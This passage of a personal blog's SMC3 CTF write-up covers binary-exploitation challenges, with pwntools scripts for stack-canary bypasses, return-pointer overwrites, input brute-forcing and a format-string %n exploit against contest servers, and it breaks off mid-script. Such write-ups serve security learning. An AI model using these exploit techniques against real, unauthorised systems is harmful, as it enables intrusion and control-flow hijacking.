@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>SMC3 CTF</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/smc3/#binary-exploitation">Binary Exploitation</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#be01">be01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#be02">be02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#bm01">bm01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#bh02">bh02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#bh03">bh03</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#bx01">bx01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#bm03">bm03</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/smc3/#crypto">Crypto</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#ce01">ce01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#ce02">ce02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#ce03">ce03</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#ce04">ce04</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/smc3/#forensics">Forensics</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#fe01">fe01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#fe02">fe02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#fe03">fe03</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/smc3/#network">Network</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#ne01">ne01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#nm01">nm01</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/smc3/#web">Web</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#we01">we01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#we02">we02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#we03">we03</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#we04">we04</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wm01">wm01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wm02">wm02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wm03">wm03</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wh01">wh01</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wh02">wh02</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wh03">wh03</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/smc3/#wx01">wx01</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>SMC3 CTF</h1>
+    </header>
+
+    <div class="content">
+        <p>SMC3 was a CTF put on by the University of North Georgia and there were 14 students from each of the six senior military colleges competing.  I had a good time competing and I ended up placing in 3rd place!  I've included my writeups for the majority of challenges which I completed.</p>
+<span id="continue-reading"></span><h1 id="binary-exploitation">Binary Exploitation</h1>
+<h2 id="be01">be01</h2>
+<p>The flag was stored inside the binary and could be retrieved with strings</p>
+<p><code>strings be01 | grep Flag</code></p>
+<p>flag: <code>sTriNGS-r-EZ-7819</code></p>
+<h2 id="be02">be02</h2>
+<p>the provided source code printed out the flag when executed</p>
+<p><code>gcc be02.c; ./a.out</code></p>
+<p>flag: <code>c0mpILE-tIME_1822</code></p>
+<h2 id="bm01">bm01</h2>
+<p>the flag checks if one character in your input is b and if it is it will give you the flag</p>
+<p><code>python -c "print('b' * 79)" | nc ggcs-bm01.allyourbases.co 8134</code></p>
+<p>flag: <code>c0MinG-Up_bs-8788</code></p>
+<h2 id="bh02">bh02</h2>
+<p>simple constant stack canary.  The canary was <code>:)</code> and the loop terminated if the byte after it was <code>f</code></p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;termite&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># p = process(&#39;./bh02&#39;)
+</span><span style="font-style:italic;color:#5c6773;"># p = gdb.debug(&quot;./bh02&quot;)
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&#39;ggcs-bh02.allyourbases.co&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">8133</span><span>)
+</span><span>
+</span><span>
+</span><span>buf_length </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x50
+</span><span>
+</span><span>payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;f&#39; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">0x32 </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;:)f&#39;
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;:&quot;</span><span>))
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span></code></pre>
+<p>flag: <code>caNaRY-CoalMINE-2811</code></p>
+<h2 id="bh03">bh03</h2>
+<p>we don't have a binary for this one. The server it tells us to connect to gives us three functions to return to and then tells us the return pointer before exiting.  I used cyclic to determine that the correct offset was 45 and then wrote a python script to read the addresses in and overwrite the return pointers correctly.  After successfully returning to all three functions it gives us this text.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;ggcs-bh03.allyourbases.co&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">1337</span><span>)
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;: &quot;</span><span>))
+</span><span>three </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;function three: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(three))
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;: &quot;</span><span>))
+</span><span>two </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;function two: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(two))
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;: &quot;</span><span>))
+</span><span>one </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;function one: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(one))
+</span><span>
+</span><span style="color:#f28779;">print</span><span>(p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;you?&quot;</span><span>))
+</span><span>
+</span><span>payload </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">cyclic</span><span>(</span><span style="color:#ffcc66;">49</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">4</span><span>) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(three) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(two) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(one) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(three)
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span></code></pre>
+<p><code>RmxhZzogUmV UVE9mdW5jVGl PTi0xOTkw</code></p>
+<p>I tried rot13 once and then stuck it into cyberchef and played around with it.  It ended up being base64</p>
+<p>flag: <code>ReTTOfuncTiON-1990</code></p>
+<h2 id="bx01">bx01</h2>
+<p>what the fuck</p>
+<p><code>111111111111111111111111111%n</code>
+made it print out
+<code>Object validated, contents is 'Right now I would be number 1'</code></p>
+<p>???</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>itertools
+</span><span style="color:#ffa759;">import </span><span>string
+</span><span style="color:#ffa759;">from </span><span>multiprocessing </span><span style="color:#ffa759;">import </span><span>Pool
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>tqdm
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">check</span><span>(</span><span style="color:#ffcc66;">i</span><span>):
+</span><span>    p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&#39;ggcs-bx01.allyourbases.co&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">9171</span><span>)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;&gt; &quot;</span><span>)
+</span><span>    p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(i))
+</span><span>    res </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>    </span><span style="color:#ffa759;">if b</span><span style="color:#bae67e;">&#39;Invalid&#39; </span><span style="color:#f29e74;">not in </span><span>res:
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;with: &quot;</span><span style="color:#ccc9c2cc;">, </span><span>i)
+</span><span>        </span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;result: &quot;</span><span style="color:#ccc9c2cc;">, </span><span>res)
+</span><span>
+</span><span>
+</span><span>tasks </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">list</span><span>(itertools</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">combinations</span><span>(string</span><span style="color:#f29e74;">.</span><span>printable</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">2</span><span>))
+</span><span>
+</span><span>pool </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Pool</span><span>(</span><span style="color:#ffcc66;">processes</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">8</span><span>)
+</span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span>tqdm</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">tqdm</span><span>(pool</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">imap_unordered</span><span>(check</span><span style="color:#ccc9c2cc;">, </span><span>tasks)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">total</span><span style="color:#f29e74;">=</span><span style="color:#f28779;">len</span><span>(tasks)):
+</span><span>    </span><span style="color:#ffa759;">pass
+</span></code></pre>
+<p>i used this script to check every printable 2 char combination to find vulnerabilities.</p>
+<p>flag: <code>tRUNkated-EveRYTHinG-6761</code></p>
+<h2 id="bm03">bm03</h2>
+<p>this exploit centered around a printf vulnerability which could be found in the transaction dialog.  After a valid transaction it would print out the user name directly through through printf and as such was vulnerable to a string format exploit.</p>
+<p>My exploit was in two parts - one to leak the stack address and program base and one to take advantage of the %n string formatter to write the address of the read_flag function to the saved return pointer.</p>
+<p>my first payload was <code>%x.%364$x</code> which leaked the address of a variable on the stack and a pointer to something in the program code.  I determined the offsets from the base and used these values to find the location of EBP in the account menu function and the program base.</p>
+<p>I then used a payload like <code>%{address of read_flag}x%333$hn</code> to overwrite the return pointer.  the 333rd "argument" pointer to the first four bytes of the reference argument so I sent the address of the return pointer as the reference argument.  The goal was to pad out the left with a bunch of spaces matching the address of read_flag.  This value would then be written to the return pointer, allowing me to read the flag.</p>
+<p>Once the return pointer was overwritten I just had to return and it would load read_flag.</p>
+<p>The server wasn't running aslr so my address leaking exploit ended up being useless.  Good thing because the server was slow and I couldn't manage to leak address and then get the flag in the same session.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&#39;termite&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;-e&#39;</span><span>]
+</span><span>
+</span><span>account_id_counter </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">recv_input</span><span>():
+</span><span>	x </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;:&gt;&quot;</span><span>)
+</span><span>	</span><span style="font-style:italic;color:#5c6773;"># print(x)
+</span><span>
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">process</span><span>(</span><span style="color:#bae67e;">&#39;./bm03&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">env </span><span style="color:#f29e74;">= </span><span>{</span><span style="color:#bae67e;">&quot;TERM&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;xterm-256color&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;SHELL&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/usr/bin/zsh&quot;</span><span>})
+</span><span style="font-style:italic;color:#5c6773;"># p = remote(&#39;bm03.allyourbases.co&#39;, 9010)
+</span><span style="font-style:italic;color:#5c6773;"># p = gdb.debug(&#39;./bm03&#39;, env = {&quot;TERM&quot;: &quot;xterm-256color&quot;, &quot;SHELL&quot;: &quot;/usr/bin/zsh&quot;})
+</span><span>
+</span><span>e </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&#39;./bm03&#39;</span><span>)
+</span><span>
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># creating user to leak esp
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;</span><span style="color:#ffcc66;">%x</span><span style="color:#bae67e;">.%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">$x&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="color:#ffcc66;">91</span><span style="color:#f29e74;">*</span><span style="color:#ffcc66;">4</span><span>)) </span><span style="font-style:italic;color:#5c6773;"># 91*4 is stack offset to something in program memory 
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># log in
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># create account 1
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># create account 2
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;a&#39;</span><span>)
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># make transaction
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(account_id_counter))
+</span><span>account_id_counter </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(account_id_counter))
+</span><span>account_id_counter </span><span style="color:#f29e74;">+= </span><span style="color:#ffcc66;">1
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">&#39;</span><span>)
+</span><span>addrs </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&#39;</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">&#39;</span><span>)[</span><span style="color:#ccc9c2cc;">:</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1</span><span>]
+</span><span>addrs </span><span style="color:#f29e74;">= </span><span>[</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(x</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>) </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>addrs</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;.&#39;</span><span>) </span><span style="color:#ffa759;">if </span><span>x </span><span style="color:#f29e74;">not in </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;&#39;</span><span>]
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;&quot;</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;0&quot;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;31337&quot;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span>
+</span><span>ebp </span><span style="color:#f29e74;">= </span><span>addrs[</span><span style="color:#ffcc66;">0</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">0x1b4
+</span><span style="font-style:italic;color:#5c6773;"># ebp = 0xffffdb18
+</span><span>program_base </span><span style="color:#f29e74;">= </span><span>addrs[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0xb203
+</span><span style="font-style:italic;color:#5c6773;"># program_base = 0x56555000
+</span><span>saved_eip </span><span style="color:#f29e74;">= </span><span>ebp </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">4
+</span><span>read_flag </span><span style="color:#f29e74;">= </span><span>program_base </span><span style="color:#f29e74;">+ </span><span>e</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;_Z9read_flagv&#39;</span><span>]
+</span><span style="font-style:italic;color:#5c6773;"># print([hex(x) for x in addrs])
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;ebp: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(ebp) )
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;program_base: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(program_base))
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;read_flag: &quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(read_flag </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xfff</span><span>))
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># writing time
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;2&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># creating user to leak esp
+</span><span>
+</span><span>base </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">$hn&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>(</span><span style="color:#ffcc66;">333</span><span>)
+</span><span>
+</span><span>pad </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;%</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">x&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">format</span><span>((read_flag </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xffff</span><span>) </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">0x15</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(pad </span><span style="color:#f29e74;">+ </span><span>base)
+</span><span style="color:#ffd580;">recv_input</span><span>()
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&#39;1&#39;</span><span>)
+</span><span style="color:#ffd580;">recv_input</span><span>()
